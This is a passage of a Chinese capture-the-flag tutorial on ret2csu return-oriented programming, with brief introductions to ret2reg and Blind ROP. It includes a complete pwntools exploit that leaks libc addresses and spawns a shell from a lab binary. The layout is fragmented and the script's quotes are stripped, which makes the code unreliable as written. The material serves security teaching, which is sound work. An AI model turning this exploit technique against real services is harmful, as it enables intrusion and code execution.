\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528x64\u4e0b\u7684__libc_scu_init\u4e2d\u7684gadgets\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u7528\u6765\u5bf9libc\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u7684\uff0c\u800c\u4e00\u822c\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528libc\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4f1a\u5b58\u5728\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570(\u5f53\u7136\uff0c\u4e0d\u540c\u7248\u672c\u7684\u8fd9\u4e2a\u51fd\u6570\u6709\u4e00\u5b9a\u7684\u533a\u522b)\n\n\n.text:\n00000000004005\nC0\n \n; void _libc_csu_init(void)\n\n\n.text\n:\n00000000004005\nC0\n                 \npublic\n \n__libc_csu_init\n\n\n.text:\n00000000004005\nC0\n \n__libc_csu_init\n \nproc\n \nnear\n               \n; DATA XREF: _start+16\u0018o\n\n\n.text\n:\n00000000004005\nC0\n                 \npush\n    \nr15\n\n\n.text:\n00000000004005\nC2\n                 \npush\n    \nr14\n\n\n.text:\n00000000004005\nC4\n                 \nmov\n     \nr15d\n,\n \nedi\n\n\n.text:\n00000000004005\nC7\n                 \npush\n    \nr13\n\n\n.text:\n00000000004005\nC9\n                 \npush\n    \nr12\n\n\n.text:\n00000000004005\nCB\n                 \nlea\n     \nr12\n,\n \n__frame_dummy_init_array_entry\n\n\n.text:\n00000000004005\nD2\n                 \npush\n    \nrbp\n\n\n.text:\n00000000004005\nD3\n                 \nlea\n     \nrbp\n,\n \n__do_global_dtors_aux_fini_array_entry\n\n\n.text:\n00000000004005\nDA\n                 \npush\n    \nrbx\n\n\n.text:\n00000000004005\nDB\n                 \nmov\n     \nr14\n,\n \nrsi\n\n\n.text:\n00000000004005\nDE\n                 \nmov\n     \nr13\n,\n \nrdx\n\n\n.text:\n00000000004005\nE1\n                 \nsub\n     \nrbp\n,\n \nr12\n\n\n.text:\n00000000004005\nE4\n                 \nsub\n     \nrsp\n,\n \n8\n\n\n.text:\n00000000004005\nE8\n                 \nsar\n     \nrbp\n,\n \n3\n\n\n.text:\n00000000004005\nEC\n                 \ncall\n    \n_init_proc\n\n\n.text:\n00000000004005\nF1\n                 \ntest\n    \nrbp\n,\n \nrbp\n\n\n.text:\n00000000004005\nF4\n                 \njz\n      \nshort\n \nloc_400616\n\n\n.text:\n00000000004005\nF6\n                 \nxor\n     \nebx\n,\n \nebx\n\n\n.text:\n00000000004005\nF8\n                 \nnop\n     \ndword\n \nptr\n \n[\nrax\n+\nrax\n+\n00000000\nh\n]\n\n\n.text:\n0000000000400600\n\n\n.text:\n0000000000400600\n \nloc_400600:\n                             \n; CODE XREF: __libc_csu_init+54\u0019j\n\n\n.text:\n0000000000400600\n                 \nmov\n     \nrdx\n,\n \nr13\n\n\n.text:\n0000000000400603\n                 \nmov\n     \nrsi\n,\n \nr14\n\n\n.text:\n0000000000400606\n                 \nmov\n     \nedi\n,\n \nr15d\n\n\n.text:\n0000000000400609\n                 \ncall\n    \nqword\n \nptr\n \n[\nr12\n+\nrbx\n*\n8\n]\n\n\n.text:\n000000000040060\nD\n                 \nadd\n     \nrbx\n,\n \n1\n\n\n.text:\n0000000000400611\n                 \ncmp\n     \nrbx\n,\n \nrbp\n\n\n.text:\n0000000000400614\n                 \njnz\n     \nshort\n \nloc_400600\n\n\n.text:\n0000000000400616\n\n\n.text:\n0000000000400616\n \nloc_400616:\n                             \n; CODE XREF: __libc_csu_init+34\u0018j\n\n\n.text:\n0000000000400616\n                 \nadd\n     \nrsp\n,\n \n8\n\n\n.text:\n000000000040061\nA\n                 \npop\n     \nrbx\n\n\n.text:\n000000000040061\nB\n                 \npop\n     \nrbp\n\n\n.text:\n000000000040061\nC\n                 \npop\n     \nr12\n\n\n.text:\n000000000040061\nE\n                 \npop\n     \nr13\n\n\n.text:\n0000000000400620\n                 \npop\n     \nr14\n\n\n.text:\n0000000000400622\n                 \npop\n     \nr15\n\n\n.text:\n0000000000400624\n                 \nretn\n\n\n.text:\n0000000000400624\n \n__libc_csu_init\n \nendp\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u51e0\u70b9\n\n\n\n\n\u4ece0x000000000040061A\u4e00\u76f4\u5230\u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020\u6808\u4e0a\u6570\u636e\u6765\u63a7\u5236rbx,rbp,r12,r13,r14,r15\u5bc4\u5b58\u5668\u7684\u6570\u636e\u3002\n\n\n\u4ece0x0000000000400600\u52300x0000000000400609\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06r13\u8d4b\u7ed9rdx,\u5c06r14\u8d4b\u7ed9rsi\uff0c\u5c06r15d\u8d4b\u7ed9edi\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u8fd9\u91cc\u8d4b\u7ed9\u7684\u662fedi\uff0c\n\u4f46\u5176\u5b9e\u6b64\u65f6rdi\u7684\u9ad832\u4f4d\u5bc4\u5b58\u5668\u503c\u4e3a0\uff08\u81ea\u884c\u8c03\u8bd5\uff09\n\uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rdi\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ea\u4e0d\u8fc7\u53ea\u80fd\u63a7\u5236\u4f4e32\u4f4d\uff09\uff0c\u800c\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e5f\u662fx64\u51fd\u6570\u8c03\u7528\u4e2d\u4f20\u9012\u7684\u524d\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a7\u5236r12\u4e0erbx\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e3a0\uff0cr12\u4e3a\u5b58\u50a8\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u4ece0x000000000040060D\u52300x0000000000400614\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e0erbp\u7684\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3arbx+1=rbp\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u4f1a\u6267\u884cloc_400600\uff0c\u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u6c47\u7f16\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u8bbe\u7f6erbx=0\uff0crbp=1\u3002\n\n\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\u84b8\u7c73\u7684\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u4e4blinux_x64\u7bc7\u4e2dlevel5\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\u68c0\u67e5\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\n\n\n\u279c  ret2__libc_csu_init git:\n(\niromise\n)\n \u2717 checksec level5   \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\n\n\n\u5176\u6b21\uff0c\u5bfb\u627e\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6808\u6ea2\u51fa\n\n\nssize_t\n \nvulnerable_function\n()\n\n\n{\n\n  \nchar\n \nbuf\n;\n \n// [sp+0h] [bp-80h]@1\n\n\n  \nreturn\n \nread\n(\n0\n,\n \nbuf\n,\n \n0x200uLL\n);\n\n\n}\n\n\n\n\n\n\u7b80\u5355\u6d4f\u89c8\u4e0b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u65e2\u6ca1\u6709system\u51fd\u6570\u5730\u5740\uff0c\u4e5f\u6ca1\u6709/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u6784\u9020\u4e86\u3002\n\n\n\u6ce8\uff1a\u8fd9\u91cc\u6211\u5c1d\u8bd5\u5728\u6211\u672c\u673a\u4f7f\u7528system\u51fd\u6570\u6765\u83b7\u53d6shell\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u73af\u5883\u53d8\u91cf\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662fexecve\u6765\u83b7\u53d6shell\u3002\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u83b7\u53d6write\u51fd\u6570\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570\n\n\n\u6839\u636elibcsearcher\u83b7\u53d6\u5bf9\u5e94libc\u7248\u672c\u4ee5\u53caexecve\u51fd\u6570\u5730\u5740\n\n\n\u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u5411bss\u6bb5\u5199\u5165execve\u5730\u5740\u4ee5\u53ca'/bin/sh\u2019\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570\u3002\n\n\n\u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u6267\u884cexecve('/bin/sh')\u83b7\u53d6shell\u3002\n\n\n\n\nexp\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\n\n##context.log_level = \ndebug\n\n\n\nlevel5\n \n=\n \nELF\n(\n./level5\n)\n\n\nsh\n \n=\n \nprocess\n(\n./level5\n)\n\n\n\nwrite_got\n \n=\n \nlevel5\n.\ngot\n[\nwrite\n]\n\n\nread_got\n \n=\n \nlevel5\n.\ngot\n[\nread\n]\n\n\nmain_addr\n \n=\n \nlevel5\n.\nsymbols\n[\nmain\n]\n\n\nbss_base\n \n=\n \nlevel5\n.\nbss\n()\n\n\ncsu_front_addr\n \n=\n \n0x0000000000400600\n\n\ncsu_end_addr\n \n=\n \n0x000000000040061A\n\n\nfakeebp\n \n=\n \nb\n \n*\n \n8\n\n\n\n\ndef\n \ncsu\n(\nrbx\n,\n \nrbp\n,\n \nr12\n,\n \nr13\n,\n \nr14\n,\n \nr15\n,\n \nlast\n):\n\n    \n# pop rbx,rbp,r12,r13,r14,r15\n\n    \n# rbx should be 0,\n\n    \n# rbp should be 1,enable not to jump\n\n    \n# r12 should be the function we want to call\n\n    \n# rdi=edi=r15d\n\n    \n# rsi=r14\n\n    \n# rdx=r13\n\n    \npayload\n \n=\n \na\n \n*\n \n0x80\n \n+\n \nfakeebp\n\n    \npayload\n \n+=\n \np64\n(\ncsu_end_addr\n)\n \n+\n \np64\n(\nrbx\n)\n \n+\n \np64\n(\nrbp\n)\n \n+\n \np64\n(\nr12\n)\n \n+\n \np64\n(\n\n        \nr13\n)\n \n+\n \np64\n(\nr14\n)\n \n+\n \np64\n(\nr15\n)\n\n    \npayload\n \n+=\n \np64\n(\ncsu_front_addr\n)\n\n    \npayload\n \n+=\n \na\n \n*\n \n0x38\n\n    \npayload\n \n+=\n \np64\n(\nlast\n)\n\n    \nsh\n.\nsend\n(\npayload\n)\n\n    \nsleep\n(\n1\n)\n\n\n\n\nsh\n.\nrecvuntil\n(\nHello, World\n\\n\n)\n\n\n## RDI, RSI, RDX, RCX, R8, R9, more on the stack\n\n\n## write(1,write_got,8)\n\n\ncsu\n(\n0\n,\n \n1\n,\n \nwrite_got\n,\n \n8\n,\n \nwrite_got\n,\n \n1\n,\n \nmain_addr\n)\n\n\n\nwrite_addr\n \n=\n \nu64\n(\nsh\n.\nrecv\n(\n8\n))\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nwrite\n,\n \nwrite_addr\n)\n\n\nlibc_base\n \n=\n \nwrite_addr\n \n-\n \nlibc\n.\ndump\n(\nwrite\n)\n\n\nexecve_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nexecve\n)\n\n\nlog\n.\nsuccess\n(\nexecve_addr \n \n+\n \nhex\n(\nexecve_addr\n))\n\n\n##gdb.attach(sh)\n\n\n\n## read(0,bss_base,16)\n\n\n## read execve_addr and /bin/sh\\x00\n\n\nsh\n.\nrecvuntil\n(\nHello, World\n\\n\n)\n\n\ncsu\n(\n0\n,\n \n1\n,\n \nread_got\n,\n \n16\n,\n \nbss_base\n,\n \n0\n,\n \nmain_addr\n)\n\n\nsh\n.\nsend\n(\np64\n(\nexecve_addr\n)\n \n+\n \n/bin/sh\n\\x00\n)\n\n\n\nsh\n.\nrecvuntil\n(\nHello, World\n\\n\n)\n\n\n## execve(bss_base+8)\n\n\ncsu\n(\n0\n,\n \n1\n,\n \nbss_base\n,\n \n0\n,\n \n0\n,\n \nbss_base\n \n+\n \n8\n,\n \nmain_addr\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u601d\u8003\n\n\n\u6539\u8fdb\n\n\n\u5728\u4e0a\u9762\u7684\u65f6\u5019\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e86\u8fd9\u4e2a\u901a\u7528gadgets\uff0c\u5176\u8f93\u5165\u7684\u5b57\u8282\u957f\u5ea6\u4e3a128\u3002\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u6f0f\u6d1e\u90fd\u53ef\u4ee5\u8ba9\u6211\u4eec\u8f93\u5165\u8fd9\u4e48\u957f\u7684\u5b57\u8282\u3002\u90a3\u4e48\u5f53\u5141\u8bb8\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e86\u51e0\u4e2a\u65b9\u6cd5\n\n\n\u6539\u8fdb1-\u63d0\u524d\u63a7\u5236rbx\u4e0erbp\n\n\n\u53ef\u4ee5\u770b\u5230\u5728\u6211\u4eec\u4e4b\u524d\u7684\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u6ee1\u8db3cmp\u7684\u6761\u4ef6\uff0c\u5e76\u8fdb\u884c\u8df3\u8f6c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u51cf\u5c1116\u5b57\u8282\uff0c\u5373\u6211\u4eec\u6240\u9700\u7684\u5b57\u8282\u6570\u53ea\u9700\u8981112\u3002\n\n\n\u6539\u8fdb2-\u591a\u6b21\u5229\u7528\n\n\n\u5176\u5b9e\uff0c\u6539\u8fdb1\u4e5f\u7b97\u662f\u4e00\u79cd\u591a\u6b21\u5229\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684gadgets\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u8fdb\u884c\u4e24\u6b21\u8c03\u7528\u6765\u8fbe\u5230\u7684\u76ee\u7684\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c11\u4e00\u6b21gadgets\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\u4f46\u8fd9\u91cc\u7684\u591a\u6b21\u5229\u7528\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u6761\u4ef6\n\n\n\n\n\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u591a\u6b21\u89e6\u53d1\n\n\n\u5728\u4e24\u6b21\u89e6\u53d1\u4e4b\u95f4\uff0c\u7a0b\u5e8f\u5c1a\u672a\u4fee\u6539r12-r15\u5bc4\u5b58\u5668\uff0c\u8fd9\u662f\u56e0\u4e3a\u8981\u4e24\u6b21\u8c03\u7528\u3002\n\n\n\n\n\u5f53\u7136\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4e5f\u4f1a\u9047\u5230\u4e00\u6b21\u6027\u53ef\u4ee5\u8bfb\u5165\u5927\u91cf\u7684\u5b57\u8282\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u6f0f\u6d1e\u518d\u6b21\u5229\u7528\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6211\u4eec\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684\u5b57\u8282\u5e03\u7f6e\u597d\uff0c\u4e4b\u540e\u6162\u6162\u5229\u7528\u3002\n\n\ngadget\n\n\n\u5176\u5b9e\uff0c\u9664\u4e86\u4e0a\u8ff0\u8fd9\u4e2agadgets\uff0cgcc\u9ed8\u8ba4\u8fd8\u4f1a\u7f16\u8bd1\u8fdb\u53bb\u4e00\u4e9b\u5176\u5b83\u7684\u51fd\u6570\n\n\n_init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini\n\n\n\n\n\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u4e2d\u7684\u4e00\u4e9b\u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002\u6b64\u5916\uff0c\u7531\u4e8ePC\u672c\u8eab\u53ea\u662f\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u5730\u5740\u5904\u7684\u6570\u636e\u4f20\u9012\u7ed9CPU\uff0c\u800cCPU\u5219\u53ea\u662f\u5bf9\u4f20\u9012\u6765\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\uff0c\u53ea\u8981\u89e3\u7801\u6210\u529f\uff0c\u5c31\u4f1a\u8fdb\u884c\u6267\u884c\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u5730\u5740\u8fdb\u884c\u504f\u79fb\u4ece\u800c\u6765\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u7684\u6307\u4ee4\uff0c\u53ea\u8981\u53ef\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u5d29\u6e83\u3002\n\n\n\u9700\u8981\u4e00\u8bf4\u7684\u662f\uff0c\u5728\u4e0a\u9762\u7684libc_csu_init\u4e2d\u6211\u4eec\u4e3b\u8981\u5229\u7528\u4e86\u4ee5\u4e0b\u5bc4\u5b58\u5668\n\n\n\n\n\u5229\u7528\u5c3e\u90e8\u4ee3\u7801\u63a7\u5236\u4e86rbx\uff0crbp\uff0cr12\uff0cr13\uff0cr14\uff0cr15\u3002\n\n\n\u5229\u7528\u4e2d\u95f4\u90e8\u5206\u7684\u4ee3\u7801\u63a7\u5236\u4e86rdx\uff0crsi\uff0cedi\u3002\n\n\n\n\n\u800c\u5176\u5b9elibc_csu_init\u7684\u5c3e\u90e8\u901a\u8fc7\u504f\u79fb\u662f\u53ef\u4ee5\u63a7\u5236\u5176\u4ed6\u5bc4\u5b58\u5668\u7684\u3002\u5176\u4e2d\uff0c0x000000000040061A\u662f\u6b63\u5e38\u7684\u8d77\u59cb\u5730\u5740\uff0c\n\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u57280x000000000040061f\u5904\u53ef\u4ee5\u63a7\u5236rbp\u5bc4\u5b58\u5668\uff0c\u57280x0000000000400621\u5904\u53ef\u4ee5\u63a7\u5236rsi\u5bc4\u5b58\u5668\u3002\n\u800c\u5982\u679c\u60f3\u8981\u6df1\u5165\u5730\u4e86\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5c31\u8981\u5bf9\u6c47\u7f16\u6307\u4ee4\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bb5\u8fdb\u884c\u66f4\u52a0\u900f\u5f7b\u5730\u7406\u89e3\u3002\u5982\u4e0b\u3002\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061A\n\n   \n0\nx40061a\n \n__libc_csu_init\n+\n90\n:\n   \npop\n    \nrbx\n\n   \n0\nx40061b\n \n__libc_csu_init\n+\n91\n:\n   \npop\n    \nrbp\n\n   \n0\nx40061c\n \n__libc_csu_init\n+\n92\n:\n   \npop\n    \nr12\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061b\n\n   \n0\nx40061b\n \n__libc_csu_init\n+\n91\n:\n   \npop\n    \nrbp\n\n   \n0\nx40061c\n \n__libc_csu_init\n+\n92\n:\n   \npop\n    \nr12\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061A\n+\n3\n\n   \n0\nx40061d\n \n__libc_csu_init\n+\n93\n:\n   \npop\n    \nrsp\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n \n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061e\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061f\n\n   \n0\nx40061f\n \n__libc_csu_init\n+\n95\n:\n   \npop\n    \nrbp\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x0000000000400620\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n   \n0\nx400626:\n    \nnop\n    \nWORD\n \nPTR\n \ncs\n:[\nrax\n+\nrax\n*\n1\n+\n0x0\n]\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x0000000000400621\n\n   \n0\nx400621\n \n__libc_csu_init\n+\n97\n:\n   \npop\n    \nrsi\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061A\n+\n9\n\n   \n0\nx400623\n \n__libc_csu_init\n+\n99\n:\n   \npop\n    \nrdi\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n   \n0\nx400626:\n    \nnop\n    \nWORD\n \nPTR\n \ncs\n:[\nrax\n+\nrax\n*\n1\n+\n0x0\n]\n\n   \n0\nx400630\n \n__libc_csu_fini\n:\n  \nrepz\n \nret\n \n\n\n\n\n\u9898\u76ee\n\n\n\n\n2016 XDCTF pwn100\n\n\n2016 \u534e\u5c71\u676f SU_PWN\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttp://wooyun.jozxing.cc/static/drops/papers-7551.html\n\n\nhttp://wooyun.jozxing.cc/static/drops/binary-10638.html\n\n\n\n\nret2reg\n\n\n\u539f\u7406\n\n\n\n\n\u67e5\u770b\u6ea2\u51fa\u51fd\u8fd4\u56de\u65f6\u54ea\u4e2a\u5bc4\u5b58\u503c\u6307\u5411\u6ea2\u51fa\u7f13\u51b2\u533a\u7a7a\u95f4\n\n\n\u7136\u540e\u53cd\u7f16\u8bd1\u4e8c\u8fdb\u5236\uff0c\u67e5\u627ecall reg \u6216\u8005jmp reg\u6307\u4ee4\uff0c\u5c06 EIP\u8bbe\u7f6e\u4e3a\u8be5\u6307\u4ee4\u5730\u5740\n\n\nreg\u6240\u6307\u5411\u7684\u7a7a\u95f4\u4e0a\u6ce8\u5165Shellcode(\u9700\u8981\u786e\u4fdd\u8be5\u7a7a\u95f4\u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u4f46\u901a\u5e38\u90fd\u662f\u6808\u4e0a\u7684)\n\n\n\n\nBROP\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nBROP(Blind ROP)\u4e8e2014\u5e74\u7531Standford\u7684Andrea Bittau\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\u6210\u679c\u53d1\u8868\u5728Oakland 2014\uff0c\u5176\u8bba\u6587\u9898\u76ee\u662f\nHacking Blind\n\uff0c\u4e0b\u9762\u662f\u4f5c\u8005\u5bf9\u5e94\u7684paper\u548cslides,\u4ee5\u53ca\u4f5c\u8005\u76f8\u5e94\u7684\u4ecb\u7ecd\n\n\n\n\npaper\n\n\nslide\n\n\n\n\nBROP\u662f\u6ca1\u6709\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u6216\u8005\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e0b\uff0c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\n\n\u6e90\u7a0b\u5e8f\u5fc5\u987b\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4ee5\u4fbf\u4e8e\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\n\n\n\u670d\u52a1\u5668\u7aef\u7684\u8fdb\u7a0b\u5728\u5d29\u6e83\u4e4b\u540e\u4f1a\u91cd\u65b0\u542f\u52a8\uff0c\u5e76\u4e14\u91cd\u65b0\u542f\u52a8\u7684\u8fdb\u7a0b\u7684\u5730\u5740\u4e0e\u5148\u524d\u7684\u5730\u5740\u4e00\u6837\uff08\u8fd9\u4e5f\u5c31\u662f\u8bf4\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4f46\u662f\u5176\u53ea\u662f\u5728\u7a0b\u5e8f\u6700\u521d\u542f\u52a8\u7684\u65f6\u5019\u6709\u6548\u679c\uff09\u3002\u76ee\u524dnginx, MySQL, Apache, 